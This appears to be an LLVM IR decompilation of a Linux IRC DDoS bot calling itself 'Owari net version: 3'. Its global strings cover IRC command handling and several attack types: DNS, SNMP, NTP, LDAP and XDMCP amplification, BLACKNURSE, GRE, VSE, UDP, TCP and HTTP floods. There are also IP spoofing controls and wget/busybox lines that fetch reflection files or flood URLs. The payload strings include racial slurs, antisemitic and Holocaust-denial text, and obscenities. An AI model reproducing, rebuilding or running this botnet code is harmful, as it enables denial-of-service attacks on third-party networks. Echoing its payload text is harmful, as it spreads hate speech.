source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%pollfd = type { i32, i16, i16 }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%rlimit = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%timespec = type { i32, i32 }

@df = internal unnamed_addr global i1 false
@of = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_806f858.21 = global i32 0
@global_var_806f884.22 = local_unnamed_addr global i32* @global_var_806f858.21
@global_var_806e844.23 = constant i32 0
@global_var_806f85c.25 = local_unnamed_addr global i32 0
@global_var_8068845.26 = constant [7 x i8] c"x86_32\00"
@global_var_807d3d0.29 = local_unnamed_addr global i32 0
@global_var_806884c.30 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_80748f4.31 = local_unnamed_addr global i32 0
@global_var_807e574.32 = local_unnamed_addr global i32 0
@global_var_806886c.35 = constant [63 x i8] c"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\00"
@global_var_807d3c4.36 = local_unnamed_addr global i32 0
@global_var_80688ab.37 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_80688c4.38 = constant [33 x i8] c"NOTICE %s :GET <host> <save as>\0A\00"
@global_var_80688e8.39 = constant [37 x i8] c"NOTICE %s :Unable to create socket.\0A\00"
@global_var_806890d.40 = constant [8 x i8] c"http://\00"
@global_var_8068918.41 = constant [39 x i8] c"NOTICE %s :Unable to resolve address.\0A\00"
@global_var_8068940.42 = constant [39 x i8] c"NOTICE %s :Unable to connect to http.\0A\00"
@global_var_8068968.43 = constant [276 x i8] c"GET /%s HTTP/1.1\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_8068a7c.44 = constant [28 x i8] c"NOTICE %s :Receiving file.\0A\00"
@global_var_8068a98.45 = constant [3 x i8] c"wb\00"
@global_var_8068a9b.46 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_8068aa0.47 = constant [24 x i8] c"NOTICE %s :Saved as %s\0A\00"
@global_var_8068ab8.48 = constant [32 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d\0A\00"
@global_var_8068ad8.49 = constant [46 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\0A\00"
@global_var_8068b08.50 = constant [70 x i8] c"NOTICE %s :Owari net version: 3 by Kuze-senpai, Milenko and Morpheus\0A\00"
@global_var_8068b4e.51 = constant [24 x i8] c"NOTICE %s :NICK <nick>\0A\00"
@global_var_8068b68.52 = constant [54 x i8] c"NOTICE %s :Nick cannot be larger than 32 characters.\0A\00"
@global_var_807d3cc.53 = local_unnamed_addr global i32 0
@global_var_8068b9e.54 = constant [9 x i8] c"NICK %s\0A\00"
@global_var_8068ba7.55 = constant [8 x i8] c"GIGANET\00"
@global_var_8068baf.56 = constant [16 x i8] c"NICK [%s|%s]%s\0A\00"
@global_var_8068bbf.57 = constant [27 x i8] c"NOTICE %s :DISABLE <pass>\0A\00"
@global_var_8068c00.60 = constant [34 x i8] c"NOTICE %s :Current status is: %s\0A\00"
@global_var_8068c22.61 = constant [30 x i8] c"NOTICE %s :Already disabled.\0A\00"
@global_var_8068c40.62 = constant [37 x i8] c"NOTICE %s :Password too long! > 254\0A\00"
@global_var_807d2c0.63 = global i32 0
@global_var_8068c68.64 = constant [31 x i8] c"NOTICE %s :Disable sucessful.\0A\00"
@global_var_8068c87.65 = constant [26 x i8] c"NOTICE %s :ENABLE <pass>\0A\00"
@global_var_8068ca1.66 = constant [29 x i8] c"NOTICE %s :Already enabled.\0A\00"
@global_var_8068cbe.67 = constant [27 x i8] c"NOTICE %s :Wrong password\0A\00"
@global_var_8068cd9.68 = constant [30 x i8] c"NOTICE %s :Password correct.\0A\00"
@global_var_8068cf8.69 = constant [31 x i8] c"NOTICE %s :Removed all spoofs\0A\00"
@global_var_8068d18.70 = constant [75 x i8] c"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\0A\00"
@global_var_8074d00.71 = global i32 0
@global_var_8068d64.72 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_8074d20.73 = global i32 0
@global_var_8074d24.74 = local_unnamed_addr global i32 0
@global_var_8074d28.75 = local_unnamed_addr global i32 0
@global_var_806ffa4.76 = local_unnamed_addr global i32 4095
@global_var_806ffa0.77 = local_unnamed_addr global i32 362436
@global_var_8068d85.78 = constant [14 x i8] c"192.168.3.100\00"
@global_var_807e520.80 = local_unnamed_addr global i32 0
@global_var_8068db4.81 = constant [67 x i8] c"NOTICE %s :DNS <IP> <port> <reflection file url> <threads> <time>\0A\00"
@global_var_8068df8.82 = constant [171 x i8] c"wget \22%s\22 -q -O DNS.txt || busybox wget \22%s\22 -O DNS.txt || /bin/busybox wget \22%s\22 -O DNS.txt || /usr/busybox wget \22%s\22 -O DNS.txt || /var/run/busybox wget \22%s\22 -O DNS.txt\00"
@1 = constant i32 1313079410
@global_var_8068ea5.84 = constant [8 x i8] c"DNS.txt\00"
@global_var_8068eb0.85 = constant [36 x i8] c"NOTICE %s :DNS amp attacking %s:%s\0A\00"
@global_var_8068ed4.86 = constant i32 1124073541
@global_var_8068f18.87 = constant [13 x i8] c"192.168.1.83\00"
@global_var_807d3c8.89 = local_unnamed_addr global i32 0
@global_var_806ffa8.90 = local_unnamed_addr global i32 83
@global_var_8068f28.91 = constant [99 x i8] c"NOTICE %s :SNMP <IP> <port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_8068f8c.92 = constant [176 x i8] c"wget \22%s\22 -q -O SNMP.txt || busybox wget \22%s\22 -O SNMP.txt || /bin/busybox wget \22%s\22 -O SNMP.txt || /usr/busybox wget \22%s\22 -O SNMP.txt || /var/run/busybox wget \22%s\22 -O SNMP.txt\00"
@global_var_806903c.93 = constant [9 x i8] c"SNMP.txt\00"
@global_var_8069048.94 = constant [37 x i8] c"NOTICE %s :SNMP amp attacking %s:%s\0A\00"
@global_var_8069070.95 = constant [89 x i8] c"NOTICE %s :VSE <target IP> <target port> <thread> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_80690cc.96 = constant [32 x i8] c"NOTICE %s :VSE attacking %s:%s\0A\00"
@global_var_80690ec.97 = constant [35 x i8] c"NOTICE %s :WGETFLOOD <url> <secs>\0A\00"
@global_var_806762c.98 = constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_8067678.99 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_80676cc.100 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_8067724.101 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_806777c.102 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_80677bc.103 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_8067804.104 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_806785c.105 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_80678c8.106 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_8067920.107 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_8067970.108 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_8067994.109 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_80679ef.110 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_8067a00.111 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_8067a30.112 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_8067a54.113 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_8067a76.114 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_8067a90.115 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_8067ad0.116 = constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00"
@global_var_8067b20.117 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_8067b6c.118 = constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00"
@global_var_8067ba8.119 = constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00"
@global_var_8067c04.120 = constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00"
@global_var_8067c6c.121 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_8067ce0.122 = constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00"
@global_var_8067d58.123 = constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00"
@global_var_8067db4.124 = constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00"
@global_var_8067e08.125 = constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00"
@global_var_8067e90.126 = constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_8067ee4.127 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_8067f4c.128 = constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00"
@global_var_8067fa8.129 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_8067ff8.130 = constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00"
@global_var_806803c.131 = constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00"
@global_var_8068090.132 = constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00"
@global_var_80680dc.133 = constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_8068120.134 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00"
@global_var_8068174.135 = constant [123 x i8] c"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6\00"
@global_var_80681f0.136 = constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00"
@global_var_806825c.137 = constant [110 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00"
@global_var_80682cc.138 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00"
@global_var_8068328.139 = constant [116 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1\00"
@global_var_806839c.140 = constant [110 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)\00"
@global_var_806840c.141 = constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00"
@global_var_80684a4.142 = constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)\00"
@global_var_80684f0.143 = constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00"
@global_var_8068558.144 = constant [58 x i8] c"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)\00"
@global_var_8068594.145 = constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00"
@global_var_80685c4.146 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00"
@global_var_806faa0.147 = global [49 x i8*] [i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_806762c.98, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_8067678.99, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_80676cc.100, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_8067724.101, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_806777c.102, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_80677bc.103, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_8067804.104, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_806785c.105, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @global_var_80678c8.106, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_8067920.107, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_8067970.108, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_8067994.109, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_80679ef.110, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_8067a00.111, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_8067a30.112, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_8067a54.113, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_8067a76.114, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_8067a90.115, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_8067ad0.116, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_8067b20.117, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @global_var_8067b6c.118, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @global_var_8067ba8.119, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @global_var_8067c04.120, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_8067c6c.121, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @global_var_8067ce0.122, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_8067d58.123, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_8067db4.124, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @global_var_8067e08.125, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_8067e90.126, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @global_var_8067ee4.127, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_8067f4c.128, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_8067fa8.129, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_8067ff8.130, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_806803c.131, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @global_var_8068090.132, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_80680dc.133, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_8068120.134, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_8068174.135, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @global_var_80681f0.136, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_806825c.137, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_80682cc.138, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @global_var_8068328.139, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_806839c.140, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_806840c.141, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @global_var_80684a4.142, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @global_var_80684f0.143, i32 0, i32 0), i8* getelementptr inbounds ([58 x i8], [58 x i8]* @global_var_8068558.144, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_8068594.145, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_80685c4.146, i32 0, i32 0)]
@global_var_806910f.148 = constant [29 x i8] c"NOTICE %s :HTTP Flooding %s\0A\00"
@global_var_806912c.149 = constant [181 x i8] c"wget -U \22%s\22 -q \22%s\22 -O /dev/null || busybox wget -U \22%s\22 -q \22%s\22 -O /dev/null || /bin/busybox wget -U \22%s\22 -q \22%s\22 -O /dev/null || /usr/busybox wget -U \22%s\22 -q \22%s\22 -O /dev/null &\00"
@global_var_80691ec.152 = constant [112 x i8] c"NOTICE %s :NTP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_806925c.153 = constant [171 x i8] c"wget \22%s\22 -q -O NTP.txt || busybox wget \22%s\22 -O NTP.txt || /bin/busybox wget \22%s\22 -O NTP.txt || /usr/busybox wget \22%s\22 -O NTP.txt || /var/run/busybox wget \22%s\22 -O NTP.txt\00"
@global_var_8069307.154 = constant [8 x i8] c"NTP.txt\00"
@global_var_8069310.155 = constant [36 x i8] c"NOTICE %s :NTP amp attacking %s:%s\0A\00"
@global_var_8069364.157 = constant [41 x i8] c"NOTICE %s :BLACKNURSE <target ip> <secs>\00"
@global_var_806938d.158 = constant [7 x i8] c"socket\00"
@global_var_8069394.159 = constant [28 x i8] c"NOTICE %s :Blacknursing %s\0A\00"
@global_var_80693b0.160 = constant [7 x i8] c"sendto\00"
@global_var_807e570.161 = local_unnamed_addr global i32 0
@global_var_80693b7.162 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_807e540.163 = global i32 0
@global_var_807d3dc.164 = global i32 0
@global_var_807e524.165 = global i32 0
@global_var_807e558.166 = global i32 0
@global_var_80693c4.167 = constant [102 x i8] c"NOTICE %s :GRE <target IP> <port dest> <number threads to use> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_806942a.168 = constant [29 x i8] c"NOTICE %s :GRE ATTACKING %s\0A\00"
@global_var_8069447.169 = constant [21 x i8] c"TSource Engine Query\00"
@global_var_806945c.170 = constant [90 x i8] c"NOTICE %s :VSE <target IP> <number threads to use> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_80694b6.171 = constant [29 x i8] c"NOTICE %s :VSE ATTACKING %s\0A\00"
@global_var_80694dc.175 = constant [114 x i8] c"NOTICE %s :XMDCP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_8069550.176 = constant [166 x i8] c"wget \22%s\22 -q -O XM.txt || busybox wget \22%s\22 -O XM.txt || /bin/busybox wget \22%s\22 -O XM.txt || /usr/busybox wget \22%s\22 -O XM.txt || /var/run/busybox wget \22%s\22 -O XM.txt\00"
@global_var_80695f6.177 = constant [7 x i8] c"XM.txt\00"
@global_var_8069600.178 = constant [32 x i8] c"NOTICE %s :XDMCP ATTACKING: %s\0A\00"
@global_var_8069654.180 = constant [113 x i8] c"NOTICE %s :LDAP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_80696c8.181 = constant [176 x i8] c"wget \22%s\22 -q -O LDAP.txt || busybox wget \22%s\22 -O LDAP.txt || /bin/busybox wget \22%s\22 -O LDAP.txt || /usr/busybox wget \22%s\22 -O LDAP.txt || /var/run/busybox wget \22%s\22 -O LDAP.txt\00"
@global_var_8069778.182 = constant [9 x i8] c"LDAP.txt\00"
@global_var_8069784.183 = constant [31 x i8] c"NOTICE %s :LDAP ATTACKING: %s\0A\00"
@global_var_80697a4.184 = constant [39 x i8] c"NOTICE %s :UDP <target> <port> <secs>\0A\00"
@global_var_80697cb.185 = constant [25 x i8] c"NOTICE %s :Packeting %s\0A\00"
@global_var_8069800.186 = constant i32 2
@global_var_8069850.187 = constant [39 x i8] c"NOTICE %s :PAN <target> <port> <secs>\0A\00"
@global_var_8069877.188 = constant [23 x i8] c"NOTICE %s :Panning %s\0A\00"
@global_var_8069920.189 = constant i32 2
@global_var_80698a0.190 = constant i32 21
@global_var_8069970.191 = constant [45 x i8] c"NOTICE %s :GIGATCP <target> <method> <secs>\0A\00"
@global_var_80699a0.192 = constant [65 x i8] c"NOTICE %s :GIGA-TCP Flooding %s using the ' %s ' method Request\0A\00"
@global_var_80699e1.193 = constant [4 x i8] c"all\00"
@global_var_80699e5.194 = constant [5 x i8] c"xmas\00"
@global_var_80699ea.195 = constant [5 x i8] c"usyn\00"
@global_var_80699ef.196 = constant [7 x i8] c"GigAck\00"
@global_var_80699f6.197 = constant [8 x i8] c"GigaSyn\00"
@global_var_80699fe.198 = constant i32 2037579820
@global_var_8069a00.199 = constant [4 x i8] c"syn\00"
@global_var_8069a04.200 = constant [4 x i8] c"rst\00"
@global_var_8069a08.201 = constant [4 x i8] c"fin\00"
@global_var_8069a0c.202 = constant [4 x i8] c"ack\00"
@global_var_8069a10.203 = constant [4 x i8] c"psh\00"
@global_var_8069a14.204 = constant [4 x i8] c"urg\00"
@global_var_8069a18.205 = constant [85 x i8] c"NOTICE %s :UNKNOWN <target> <port, 0 for random> <packet size, 0 for random> <secs>\0A\00"
@global_var_8069a78.208 = constant [49 x i8] c"NOTICE %s :Unknowning %s:%s with packet size %s\0A\00"
@global_var_8069aa9.210 = constant [4 x i8] c"std\00"
@global_var_8069aad.211 = constant [4 x i8] c"dts\00"
@global_var_8069ab1.212 = constant [4 x i8] c"lsk\00"
@global_var_8069ab5.213 = constant [4 x i8] c"kek\00"
@global_var_8069ab9.214 = constant [6 x i8] c"smack\00"
@global_var_8069abf.215 = constant [4 x i8] c"ily\00"
@global_var_8069ac3.216 = constant [10 x i8] c"tfw no gf\00"
@global_var_8069acd.217 = constant [11 x i8] c"frienzoned\00"
@global_var_8069ad8.218 = constant [4 x i8] c"tyf\00"
@global_var_8069adc.219 = constant [4 x i8] c"pos\00"
@global_var_8069ae0.220 = constant [6 x i8] c"cunts\00"
@global_var_8069ae6.221 = constant [9 x i8] c"NullzSec\00"
@global_var_8069aef.222 = constant [13 x i8] c"NullzSec rox\00"
@global_var_8069afc.223 = constant [21 x i8] c"Sh4dow on your 4head\00"
@global_var_8069b11.224 = constant [10 x i8] c"get raped\00"
@global_var_8069b1b.225 = constant [18 x i8] c"not a ddos packet\00"
@global_var_8069b2d.226 = constant [23 x i8] c"also not a ddos packet\00"
@global_var_8069b44.227 = constant [28 x i8] c"seriously not a ddos packet\00"
@global_var_8069b60.228 = constant [38 x i8] c"GET / HTTP/1.1\0D\0AHost: goatse.info\0D\0A\0D\0A\00"
@global_var_8069b88.229 = constant [37 x i8] c"GET / HTTP/1.1\0D\0AHost: tubgirl.ca\0D\0A\0D\0A\00"
@global_var_8069bb0.230 = constant [38 x i8] c"GET / HTTP/1.0\0D\0AHost: goatse.info\0D\0A\0D\0A\00"
@global_var_8069bd8.231 = constant [37 x i8] c"GET / HTTP/1.0\0D\0AHost: tubgirl.ca\0D\0A\0D\0A\00"
@global_var_8069bfd.232 = constant [16 x i8] c"8======D~~~~~~~\00"
@global_var_8069c0d.233 = constant [8 x i8] c"suck it\00"
@global_var_8069c15.234 = constant [10 x i8] c"give succ\00"
@global_var_8069c20.235 = constant [47 x i8] c"big nigger dick 8============================D\00"
@global_var_8069c4f.236 = constant [18 x i8] c"( . Y . ) tiddies\00"
@global_var_8069c61.237 = constant [9 x i8] c"bigNullz\00"
@global_var_8069c6a.238 = constant [13 x i8] c"eye pee rape\00"
@global_var_8069c77.239 = constant [21 x i8] c"eye pee address rape\00"
@global_var_8069c8c.240 = constant [8 x i8] c"IP rape\00"
@global_var_8069c94.241 = constant [13 x i8] c"This is LOIC\00"
@global_var_8069ca1.242 = constant [5 x i8] c"LOIC\00"
@global_var_8069ca6.243 = constant [5 x i8] c"HOIC\00"
@global_var_8069cab.244 = constant [5 x i8] c"XOIC\00"
@global_var_8069cb0.245 = constant [7 x i8] c"LHXOIC\00"
@global_var_8069cb8.246 = constant [33 x i8] c"A cat is fine too. Desudesudesu~\00"
@global_var_8069cd9.247 = constant [18 x i8] c"the biiiiig pussy\00"
@global_var_8069ceb.248 = constant [6 x i8] c"benis\00"
@global_var_8069cf1.249 = constant [6 x i8] c"penis\00"
@global_var_8069cf7.250 = constant [5 x i8] c"dick\00"
@global_var_8069cfc.251 = constant [7 x i8] c"vagina\00"
@global_var_8069d03.252 = constant [9 x i8] c"clitoris\00"
@global_var_8069d0c.253 = constant [6 x i8] c"pussy\00"
@global_var_8069d12.254 = constant [4 x i8] c"tfw\00"
@global_var_8069d16.255 = constant [4 x i8] c":^}\00"
@global_var_8069d1a.256 = constant [9 x i8] c"dic pic?\00"
@global_var_8069d23.257 = constant [11 x i8] c"send nudes\00"
@global_var_8069d2e.258 = constant [29 x i8] c"https://youtu.be/dQw4w9WgXcQ\00"
@global_var_8069d4b.259 = constant [24 x i8] c"Never gonna give you up\00"
@global_var_8069d63.260 = constant [25 x i8] c"Never gonna make you cry\00"
@global_var_8069d7c.261 = constant [24 x i8] c"Never gonna let you die\00"
@global_var_8069d94.262 = constant [21 x i8] c"Never gonna hurt you\00"
@global_var_8069da9.263 = constant [14 x i8] c"bush did 9/11\00"
@global_var_8069db8.264 = constant [32 x i8] c"jet fuel can't melt steel beams\00"
@global_var_8069dd8.265 = constant [24 x i8] c"Kuze-senpai is your god\00"
@global_var_8069df0.266 = constant [23 x i8] c"the illuminati is real\00"
@global_var_8069e07.267 = constant [14 x i8] c"wake up sheep\00"
@global_var_8069e15.268 = constant [22 x i8] c"i flex like david ike\00"
@global_var_8069e2c.269 = constant [35 x i8] c"6 million jews? show me the proof!\00"
@global_var_8069e4f.270 = constant [18 x i8] c"T R I G G E R E D\00"
@global_var_8069e61.271 = constant [21 x i8] c"my gf killed herself\00"
@global_var_8069e76.272 = constant [22 x i8] c"free masons suck cock\00"
@global_var_8069e8c.273 = constant [10 x i8] c"ihatejews\00"
